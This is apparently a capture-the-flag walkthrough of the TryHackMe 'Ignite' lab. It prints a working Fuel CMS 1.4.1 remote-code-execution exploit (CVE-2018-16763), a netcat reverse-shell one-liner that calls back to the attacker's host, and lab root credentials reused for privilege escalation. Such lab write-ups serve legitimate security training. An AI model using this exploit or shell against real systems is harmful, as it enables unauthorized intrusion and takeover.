---
title: TryHackMe Basic Pentesting
date: 2020-12-05
categories: [TryHackMe]
thumbnail: /assets/img/thm/ignite/ignite.png
excerpt: We use an RCE to get into fuel CMS, we later found root credentials through a PHP file.
tags: [enum4linux,RCE,linpeas,searchsploit]
---

# TryHackMe - Ignite

A new start-up has a few issues with their web server.

---

## Nmap results

Let's start off with nmap:

`nmap -sC -sV -T4 --max-rate 2500 <Box IP> -oN ignite`

![nmap](nmap.png)

`Port 80` seems to be the only port open to us.

---

## Website

Let's take a look at the website:

![website](website.png)

Looks like we'll be dealing with `Fuel CMS`. If we scroll down a bit, we can see that it gives us a direct link to login to the CMS:

![tatsit](thatsit.png)

The username and password are given to us as well.

>Username: `admin`
>Password: `admin`

---

## Exploit

Looking for an exploit on searchsploit yields an RCE for version 1.4.1.

![searchsploit](searchsploit.png)

We can get this file with `searchsploit -m <filename>`

Examining the exploit:

```python
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = raw_input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
        proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url, proxies=proxy)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print r.text[0:dup]
```

There are a couple things we need to change here, the `url` variable should point to our target's Fuel CMS page. This one is optional, but you can remove the lines pertaining to burp unless you plan on tunneling information to burp. But if you don't want to, just remove the `proxy` variable.

__My example__

```python
import requests
import urllib

url = "<box IP>"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = input('cmd:')
        exploit = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
        r = requests.get(exploit)
        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)
        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print(r.text[0:dup])
```

Running the exploit:

![rce](RCE.png)

You just have to make sure you execute your commands with quotes around them. So now we have a RCE running, lets grab a reverse shell. My go to one is netcat:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

Fill in your tun0 IP accordingly. And setup your listener with the port you chose.

![user](user.png)

Your user flag is in `/home/www-data`.

---

## Root Access

I went and got `LinEmun` and `linPEAS` onto the system, LinEnum didn't show much.

linPEAS, under

`[+] Interesting writable files owned by me or writable by everyone (not in Home)`.

There was a `database.php`, full path `/var/www/html/fuel/application/config/database.php`. You can also go back to the Fuel CMS page and see this:

![database](database.png)

__Examining `database.php`__

```php
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
```

We can see that we have the username root and a password:

>Username: `root`
>Password: `mememe`

So now let's try to change users to root and use this password.

![root](root.png)

Great! Our root flag is in `/root`.